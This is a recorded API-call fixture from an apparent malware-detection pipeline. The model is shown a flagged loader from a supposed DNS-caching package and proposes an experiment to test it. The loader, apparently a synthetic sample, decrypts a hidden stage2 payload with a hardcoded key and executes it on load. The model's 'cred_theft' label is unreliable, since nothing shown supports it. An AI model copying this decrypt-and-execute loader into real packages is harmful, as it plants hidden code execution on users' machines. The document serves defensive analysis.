@@ -1,0 +1,54 @@
+{
+  "id": "012_propose_c6c60987",
+  "role": "propose",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis. Name the\nmalicious claim, its kind, gating and severity, and a one-line description.\nThen loosely sketch which setup tools an experiment would use and which entry\npoint it would trigger. You are not the final judge; the observed run decides.\nNever dismiss a flag because the code appears benign. The tool sketch is rough —\na later agentic step builds and validates the real experiment."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent (benign baseline)\nDNS resolution with caching\n\n## Flag\n- file: lib/loader.js\n- lines: 7-11\n- why: Hardcoded cryptographic key material composed of concatenated strings, used for AES-256-GCM decryption; strong indicator of hidden encrypted payload.\n\n## Flagged code\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const crypto = require(\"crypto\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: \n7: const _k1 = \"s4ndw0rm\";\n8: const _k2 = \"_k3y_\";\n9: const _k3 = \"2024\";\n10: const _k4 = \"_v3ry_s3cr3t\";\n11: const KEY_MATERIAL = _k1 + _k2 + _k3 + _k4;\n12: \n13: function loadStage2() {\n14:   const encryptedPath = path.join(__dirname, \"stage2.enc\");\n15: \n16:   try {\n17:     const raw = fs.readFileSync(encryptedPath, \"utf-8\").trim();\n18:     const parts = raw.split(\":\");\n19: \n20:     if (parts.length !== 3) return;\n21: \n22:     const iv = Buffer.from(parts[0], \"hex\");\n23:     const authTag = Buffer.from(parts[1], \"hex\");\n24:     const encrypted = parts[2];\n25: \n26:     const key = crypto.createHash(\"sha256\").update(KEY_MATERIAL).digest();\n27: \n28:     const decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, iv);\n29:     decipher.setAuthTag(authTag);\n30: \n31:     let decrypted = decipher.update(encrypted, \"hex\", \"utf8\");\n32:     decrypted += decipher.final(\"utf8\");\n33: \n34:     const Module = require(\"module\");\n35:     const m = new Module();\n36:     m._compile(decrypted, \"stage2.js\");\n37:   } catch (e) {\n38: \n39:   }\n40: }\n41: \n42: loadStage2();\n```\n\n## Setup tools\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nPropose ONE experiment. State the malicious claim to test, its kind, gating and severity, a one-line description, exactly which trigger target you will invoke (one of ['index.js', 'install-hook.js', 'lib/loader.js'], or describe custom JS driver code), and a loose list of the setup tools you expect to use. The tool list is a sketch — do not write tool arguments yet."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-c6c60987",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "DeepInfra",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"description\": \"lib/loader.js decrypts an encrypted stage2 payload during package load, which is a hidden code execution backdoor\",\n  \"kind\": \"cred_theft\",\n  \"gating\": \"docker_gate\",\n  \"severity\": \"critical\",\n  \"triggerTargetIntent\": \"index.js\",\n  \"plannedTools\": [\"setEnv\", \"plantFiles\", \"patchFile\", \"preload\"]\n  ,\n  \"rationale\": \"The code in lib/loader.js uses hardcoded key material to decrypt a file (stage2.enc) and compile it as Node.js module. This is a classic hidden backdoor pattern — decryption of an encrypted stage2 payload that executes arbitrary code during require(). The test should invoke the package normally (e.g., require('./index.js')) and observe that the decrypted stage2 is loaded and executed.\"\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 811,
+        "completion_tokens": 188,
+        "prompt_tokens_details": {
+          "cached_tokens": 64
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "49622f24083b",
+    "transport": "strict_schema",
+    "recordedStatus": "ok",
+    "recordedTs": "2026-07-23T10:44:59.478Z",
+    "recordedLatencyMs": 5509
+  }
+}
